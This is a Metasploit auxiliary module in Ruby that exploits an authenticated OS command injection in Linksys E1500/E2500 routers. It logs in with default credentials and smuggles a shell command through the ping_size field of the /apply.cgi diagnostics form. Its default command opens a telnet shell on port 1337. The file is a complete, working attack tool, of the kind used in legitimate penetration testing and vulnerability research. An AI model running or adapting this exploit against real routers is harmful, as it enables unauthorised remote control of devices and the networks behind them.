##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Linksys E1500/E2500 Remote Command Execution',
      'Description'     => %q{
          Some Linksys Routers are vulnerable to an authenticated OS command injection.
        Default credentials for the web interface are admin/admin or admin/password. Since
        it is a blind os command injection vulnerability, there is no output for the
        executed command. A ping command against a controlled system for can be used for
        testing purposes.
      },
      'Author'          => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'OSVDB', '89912' ],
          [ 'BID', '57760' ],
          [ 'EDB', '24475' ],
          [ 'URL', 'http://homesupport.cisco.com/de-eu/support/routers/E1500' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ]
        ],
      'DisclosureDate' => 'Feb 05 2013'))

    register_options(
      [
        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
        OptString.new('CMD', [ true, 'The command to execute', 'telnetd -p 1337'])
      ], self.class)
  end

  def run
    uri = '/apply.cgi'
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

    begin
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
        'authorization' => basic_auth(user,pass)
      })

      return if res.nil?
      return if (res.code == 404)

      if [200, 301, 302].include?(res.code)
        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        print_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
        return
      end

    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end

    print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

    cmd = datastore['CMD']
    #original post request:
    #data_cmd = "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&
    #action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip="

    vprint_status("#{rhost}:#{rport} - using the following target URL: #{uri}")
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'method' => 'POST',
        'authorization' => basic_auth(user,pass),
        'vars_post' => {
          "submit_button" => "Diagnostics",
          "change_action" => "gozila_cgi",
          "submit_type" => "start_ping",
          "action" => "",
          "commit" => "0",
          "ping_ip" => "1.1.1.1",
          "ping_size" => "&#{cmd}&",
          "ping_times" => "5",
          "traceroute_ip" => ""
        }
      })
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end
    print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
    print_status("#{rhost}:#{rport} - Blind Exploitation - wait around 10 seconds till the command gets executed")
  end
end
